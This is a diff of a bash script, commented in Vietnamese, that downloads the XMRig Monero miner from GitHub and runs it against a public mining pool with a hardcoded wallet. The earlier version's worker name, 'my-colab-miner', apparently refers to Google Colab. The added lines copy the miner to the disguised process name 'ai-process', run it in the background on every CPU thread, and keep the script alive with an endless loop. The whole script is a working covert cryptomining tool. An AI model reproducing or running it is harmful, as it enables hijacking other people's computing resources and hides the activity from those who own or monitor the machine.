@@ -1,26 +1,29 @@
-
-#!/bin/bash
-
-# Thông tin tài khoản
-WALLET_ADDRESS="43ZyyD81HJrhUaVYkfyV9A4pDG3AsyMmE8ATBZVQMLVW6FMszZbU28Wd35wWtcUZESeP3CAXW14cMAVYiKBtaoPCD5ZHPCj"
-WORKER_NAME="my-colab-miner"
-
-# Thông tin Pool mới
+FAKE_NAME="ai-process"
 POOL_URL="pool.supportxmr.com:443"
+WALLET="892Z4mTTy3UhGwqGafXpj27Qttop42wVR6yU8gv43i9H2cfHP6V8guPAWAf71cm32wU9aESsqe274ZnhW8219GMiSzLhTKK"
+LOG_FILE="./xmrig.log"  # Đặt đường dẫn log
 
-# URL của phiên bản XMRig mới nhất dành cho Linux 64-bit
-XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
+if [ ! -f "./xmrig" ]; then
+    echo "[*] Đang tải XMrig..." | tee -a $LOG_FILE  # Ghi log ra file
+    curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
+    tar -xf xmrig.tar.gz
+    mv xmrig-*/xmrig . && chmod +x xmrig
+    rm -rf xmrig-*
+fi
 
-# Bắt đầu script
-echo "Đang tải XMRig từ Github..."
-curl -sL "$XMRIG_URL" -o xmrig.tar.gz
+# Đổi tên giả và phân quyền
+cp xmrig $FAKE_NAME
+chmod +x $FAKE_NAME
 
-echo "Đang giải nén file..."
-tar -zxvf xmrig.tar.gz
+# Sử dụng toàn bộ luồng CPU
+CORES_TO_USE=$(nproc)
 
-# Di chuyển vào thư mục đã giải nén
-cd xmrig-6.21.0
+echo "[*] Đang chạy tiến trình '$FAKE_NAME' sử dụng $CORES_TO_USE luồng CPU..." | tee -a $LOG_FILE
 
-# Chạy XMRig với các thông số
-echo "Bắt đầu đào Monero với pool mới..."
-./xmrig -o "$POOL_URL" -u "$WALLET_ADDRESS" -p "$WORKER_NAME" --donate-level 1 -k --tls
+# Chạy miner với full CPU, tắt donate, log nhẹ để không làm chậm
+./$FAKE_NAME -o $POOL_URL -u $WALLET -k --tls --donate-level 0 --cpu-max-threads-hint=$CORES_TO_USE --randomx-1gb-pages --randomx-no-numa --threads=$CORES_TO_USE --log-file=$LOG_FILE &
+
+# Giữ script sống
+while true; do
+    sleep 60
+done
